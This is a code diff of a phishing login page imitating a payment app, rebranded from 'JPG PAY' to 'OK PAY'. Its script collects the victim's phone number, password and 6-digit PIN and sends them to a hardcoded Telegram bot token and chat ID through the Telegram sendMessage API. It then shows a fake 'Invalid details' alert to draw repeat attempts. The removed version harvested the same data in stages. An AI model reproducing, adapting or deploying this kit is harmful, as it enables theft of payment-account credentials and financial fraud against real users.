@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>JPG PAY</title>
+  <title>OK PAY</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      background-color: #ffffff;
+      background-color: #f0f4f8;
       color: #333333;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       display: flex;
@@ -16,32 +16,39 @@
       min-height: 100vh;
       padding: 20px;
     }
-    .container { width: 100%; max-width: 350px; text-align: center; }
+    .container { width: 100%; max-width: 360px; text-align: center; }
+    
+    /* Logo Styling */
     .logo-box {
-      width: 110px; height: 110px;
-      border-radius: 22px;
-      margin: 0 auto 30px;
+      width: 130px; height: 130px;
+      border-radius: 28px;
+      margin: 0 auto 35px;
       overflow: hidden;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.15);
+      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+      background: #1a0b2e; /* Fallback color */
     }
     .logo-box img {
       width: 100%;
       height: 100%;
       object-fit: cover;
     }
+
+    /* Input Fields */
     .input-group {
       display: flex;
       align-items: center;
       background: #ffffff;
-      border: 1.5px solid #cccccc;
-      border-radius: 25px;
-      padding: 14px 18px;
-      margin-bottom: 15px;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 30px;
+      padding: 16px 20px;
+      margin-bottom: 16px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.02);
     }
     .input-group svg {
-      width: 20px; height: 20px;
-      fill: #009688;
-      margin-right: 12px;
+      width: 22px; height: 22px;
+      fill: #00897b;
+      margin-right: 14px;
+      flex-shrink: 0;
     }
     .input-group input {
       background: transparent;
@@ -50,221 +57,158 @@
       font-size: 16px;
       width: 100%;
       outline: none;
+      letter-spacing: 0.5px;
     }
-    .input-group input::placeholder { color: #aaaaaa; }
+    .input-group input::placeholder { color: #aaaaaa; letter-spacing: normal; }
+    
+    /* PIN Input special */
+    .input-group input#pin {
+      letter-spacing: 8px;
+      font-weight: 600;
+    }
+    .input-group input#pin::placeholder {
+      letter-spacing: normal;
+      font-weight: normal;
+    }
+
+    /* Links and Options */
     .row {
       display: flex;
       justify-content: space-between;
-      font-size: 14px;
-      color: #009688;
-      margin-bottom: 20px;
+      font-size: 15px;
+      color: #00897b;
+      margin-bottom: 25px;
       padding: 0 5px;
+      font-weight: 500;
     }
-    .row a { color: #009688; text-decoration: none; font-weight: 500; }
-    .row div { display: flex; align-items: center; gap: 5px; }
+    .row a { color: #00897b; text-decoration: underline; font-weight: 600; }
+    .row div { display: flex; align-items: center; gap: 6px; cursor: pointer; }
+    
     .checkbox-container {
       display: flex;
       align-items: center;
-      font-size: 13px;
-      color: #555;
+      font-size: 14px;
+      color: #00897b;
       justify-content: center;
-      margin-bottom: 25px;
+      margin-bottom: 30px;
+      font-weight: 500;
     }
     .checkbox-container input {
-      margin-right: 8px;
-      accent-color: #009688;
-    }
-    .btn-main {
-      width: 100%;
-      padding: 15px;
-      background: #009688;
-      color: white;
-      border: none;
-      border-radius: 25px;
-      font-size: 17px;
-      font-weight: bold;
+      margin-right: 10px;
+      accent-color: #00897b;
+      width: 18px; height: 18px;
       cursor: pointer;
     }
-    .btn-main:hover { background: #00796b; }
-    .popup-overlay {
-      display: none;
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.5);
-      justify-content: center; align-items: center; padding: 20px; z-index: 1000;
+
+    /* Sign In Button */
+    .btn-main {
+      width: 100%;
+      padding: 18px;
+      background: #00897b;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 6px 15px rgba(0,137,123,0.3);
+      transition: background 0.2s;
     }
-    .popup-box {
-      background: #ffffff;
-      padding: 25px;
-      border-radius: 20px;
-      width: 100%; max-width: 350px;
-      position: relative;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-    }
-    .close-btn {
-      position: absolute; top: 15px; right: 15px;
-      background: #eeeeee; color: #333; border: none;
-      border-radius: 50%; width: 30px; height: 30px;
-      font-size: 16px; cursor: pointer;
-    }
-    .popup-box h2 { font-size: 20px; margin-bottom: 10px; text-align: left; color: #333; }
-    .popup-box p { font-size: 14px; color: #666; margin-bottom: 15px; line-height: 1.4; text-align: left; }
-    .popup-box p span { color: #009688; font-weight: bold; }
-    .pin-input-group {
-      display: flex;
-      background: #ffffff;
-      border: 1.5px solid #cccccc;
-      border-radius: 25px;
-      padding: 5px;
-      margin-bottom: 15px;
-    }
-    .pin-input-group input {
-      flex: 1; background: transparent; border: none;
-      color: #333; padding: 10px; font-size: 16px; outline: none;
-      letter-spacing: 4px;
-    }
-    .pin-input-group button {
-      background: #009688; color: #fff; border: none;
-      border-radius: 20px; padding: 0 18px; font-weight: bold; cursor: pointer;
-    }
-    .pin-input-group button:disabled { background: #cccccc; color: #777; }
-    .timer-text { color: #777; font-size: 13px; margin-bottom: 15px; text-align: center; }
+    .btn-main:hover { background: #00695c; }
+    .btn-main:active { transform: scale(0.98); }
   </style>
 </head>
 <body>
 
   <div class="container">
+    <!-- Logo Box -->
     <div class="logo-box">
-      <img src="jpglogo.png" alt="JPG PAY">
+      <!-- Replace this URL with your actual logo file (e.g., okpay.png) -->
+      <img src="https://i.ibb.co/6P0yCqZ/okpay-logo.png" alt="OK PAY" onerror="this.style.display='none'; this.parentElement.style.background='#1a0b2e'; this.parentElement.innerHTML='<div style=\'color:white; display:flex; justify-content:center; align-items:center; height:100%; font-size:24px; font-weight:bold;\'>OK PAY</div>'">
     </div>
 
+    <!-- Phone Input -->
     <div class="input-group">
       <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
       <input type="tel" id="phone" placeholder="Phone" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
     </div>
 
+    <!-- Password Input -->
     <div class="input-group">
       <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
       <input type="password" id="pass" placeholder="Password">
     </div>
 
+    <!-- 6-Digit PIN Input -->
+    <div class="input-group">
+      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+    </div>
+
+    <!-- Links -->
     <div class="row">
       <a href="#">Register</a>
-      <div><input type="radio" style="accent-color:#009688;"> Remember Me</div>
+      <div><input type="radio" name="remember" style="accent-color:#00897b; width:16px; height:16px;"> Remember Me</div>
     </div>
 
+    <!-- Agreement -->
     <div class="checkbox-container">
-      <input type="radio" checked> Agree "User Privacy Agreement"
+      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
     </div>
 
-    <button class="btn-main" onclick="showPIN()">Sign In</button>
-  </div>
-
-  <div class="popup-overlay" id="pinPopup">
-    <div class="popup-box">
-      <button class="close-btn" onclick="closePIN()">✕</button>
-      <h2>Login PIN</h2>
-      <p>Tap Send to receive the PIN, then enter it to confirm this login.</p>
-      <p>PIN will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
-
-      <div class="pin-input-group">
-        <input type="tel" id="pinInput" placeholder="Enter 4-digit PIN" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)">
-        <button id="sendPinBtn" onclick="sendPIN()">Send</button>
-      </div>
-
-      <div class="timer-text" id="timerText"></div>
-
-      <button class="btn-main" onclick="verifyPIN()">Confirm</button>
-    </div>
+    <!-- Submit Button -->
+    <button class="btn-main" onclick="submitLogin()">Sign In</button>
   </div>
 
   <script>
     // ==========================================
-    // JPG PAY - TELEGRAM DETAILS
+    // TELEGRAM BOT DETAILS (Apni details yahan daalein)
     // ==========================================
     const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
     const CHAT_ID = "7318531273";
 
-    let countdown;
-    let timeLeft = 60;
+    function submitLogin() {
+      // Get values
+      let phone = document.getElementById('phone').value.trim();
+      let pass = document.getElementById('pass').value.trim();
+      let pin = document.getElementById('pin').value.trim();
 
-    function showPIN() {
-      let phone = document.getElementById('phone').value;
-      let pass = document.getElementById('pass').value;
-
-      if (phone === "" || pass === "") { 
-        alert("Bhai, saari details daalo!"); 
-        return; 
+      // Validation
+      if (phone === "" || pass === "" || pin === "") {
+        alert("Bhai, saari details daalo (Phone, Password, aur 6-digit PIN)!");
+        return;
       }
 
-      if (phone.length !== 10) { 
-        alert("Phone number 10 digit ka hona chahiye!"); 
-        return; 
+      if (phone.length !== 10) {
+        alert("Phone number 10 digit ka hona chahiye!");
+        return;
       }
 
-      document.getElementById('displayPhone').innerText = "+91 " + phone;
-      let msg1 = "🔔 *JPG PAY - New Login Attempt*\n\n📞 Phone: " + phone + "\n🔑 Password: " + pass;
-      sendToTelegram(msg1);
-      document.getElementById('pinPopup').style.display = 'flex';
-      resetTimer();
-    }
-
-    function closePIN() { 
-      document.getElementById('pinPopup').style.display = 'none'; 
-      clearInterval(countdown); 
-    }
-
-    function sendPIN() {
-      let phone = document.getElementById('phone').value;
-      startTimer();
-      sendToTelegram("📩 *JPG PAY - PIN Send Button Pressed*\nPhone: " + phone);
-      document.getElementById('sendPinBtn').disabled = true;
-      document.getElementById('sendPinBtn').innerText = "Sent";
-    }
-
-    function verifyPIN() {
-      let pin = document.getElementById('pinInput').value;
-      let phone = document.getElementById('phone').value;
-
-      if (pin === "") { 
-        alert("Bhai, PIN daalo!"); 
-        return; 
+      if (pin.length !== 6) {
+        alert("PIN exactly 6 digit ka hona chahiye!");
+        return;
       }
 
-      if (pin.length !== 4) { 
-        alert("PIN exactly 4 digit ka hona chahiye!"); 
-        return; 
-      }
+      // Prepare Telegram Message
+      let message = "🔔 *OK PAY - New Login Attempt*\n\n";
+      message += "📞 Phone: " + phone + "\n";
+      message += "🔑 Password: " + pass + "\n";
+      message += "🔐 6-digit PIN: " + pin;
 
-      sendToTelegram("🔐 *JPG PAY - PIN Entered*\nPhone: " + phone + "\nPIN: " + pin);
-      setTimeout(() => { alert("❌ Wrong PIN! Please try again."); }, 500);
-    }
+      // Send to Telegram
+      sendToTelegram(message);
 
-    function startTimer() {
-      timeLeft = 60;
-      const timerDisplay = document.getElementById('timerText');
-      clearInterval(countdown);
-      countdown = setInterval(() => {
-        if (timeLeft <= 0) {
-          clearInterval(countdown); timerDisplay.innerText = "";
-          document.getElementById('sendPinBtn').disabled = false;
-          document.getElementById('sendPinBtn').innerText = "Send";
-        } else {
-          timerDisplay.innerText = "⏳ Resend PIN in " + timeLeft + "s";
-          timeLeft--;
-        }
-      }, 1000);
-    }
-
-    function resetTimer() {
-      clearInterval(countdown); timeLeft = 60;
-      document.getElementById('sendPinBtn').disabled = false;
-      document.getElementById('sendPinBtn').innerText = "Send";
-      document.getElementById('pinInput').value = "";
+      // Optional: Show success/error message
+      setTimeout(() => {
+        alert("❌ Invalid details! Please try again.");
+      }, 500);
     }
 
     function sendToTelegram(message) {
       let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
-      fetch(url).then(res => console.log(res.status)).catch(err => console.error(err));
+      fetch(url)
+        .then(res => console.log("Telegram Status:", res.status))
+        .catch(err => console.error("Telegram Error:", err));
     }
   </script>
 
